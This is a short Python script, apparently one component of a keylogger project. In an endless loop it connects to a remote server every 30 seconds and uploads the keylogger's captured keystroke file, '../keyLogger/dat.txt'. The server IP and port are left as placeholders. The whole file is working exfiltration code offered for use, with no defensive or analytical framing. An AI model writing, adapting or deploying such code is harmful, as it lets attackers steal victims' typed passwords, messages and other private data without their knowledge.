import socket
import time

def send_file_to_server():
    server_ip = 'IP'  # Localhost IP address
    server_port = 'PORT'   # Port used by the server

    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((server_ip, server_port))
            print(f"Connected to server at {server_ip}:{server_port}")

            # Open the log file and send it
            with open('../keyLogger/dat.txt', 'rb') as file: #Set your path accordingly
                while (chunk := file.read(4096)):
                    client_socket.sendall(chunk)

            print("File sent successfully!")

        except FileNotFoundError:
            print("Error: File not found.")
        except socket.error as e:
            print(f"Socket error: {e}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()

        time.sleep(30)

if __name__ == "__main__":
    send_file_to_server()
